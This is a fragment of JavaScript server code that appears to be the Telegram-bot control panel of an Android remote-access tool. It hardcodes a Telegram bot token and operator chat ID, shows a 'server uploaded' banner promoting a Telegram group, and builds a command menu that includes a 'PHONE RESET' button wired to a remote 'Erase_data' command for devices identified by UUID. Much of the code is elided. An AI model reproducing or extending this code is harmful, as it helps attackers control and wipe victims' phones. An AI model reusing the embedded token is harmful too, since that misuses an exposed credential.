...
const token = '7686566677:AAEi04RiX-Gxo8DHF3nh0U9hqtcCEDj6Ses'
const id = '6570224614'
...
app.get('/', function (req, res) {
    res.send('<h1 align="center" style="font-size:18px; color:blue;">❖✙𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮✙❖</h1> <br> <p style="font-size:14px; text-align:center; color:red;">𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 𝗚𝗥𝗨𝗢𝗣➩ @ITS_SIHNCHAN_07</p>')
})
    ...
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                ...
                '• 📣𝗙𝗶𝗿𝘀𝘁 𝗝𝗼𝗶𝗻 👉 @ITS_SIHNCHAN_07 \n\n' +
                '• 🌺𝗠𝗮𝗶𝗻 𝗢𝘄𝗻𝗲𝗿👉 @ITS_SIHNCHAN_07 \n\n' +
                '• 🧭𝗠𝗮𝗶𝗻 𝗚𝗿𝘂𝗼𝗽👉 @ITS_SIHNCHAN_07 \n\n' +
                ...
                inline_keyboard: [
                    ...
                    [
                     ...
                     [
                        ...
                        {text: '𝗣𝗛𝗢𝗡𝗘 𝗥𝗘𝗦𝗘𝗧', callback_data: `Erase_data:${uuid}`},
                    ],
                    [
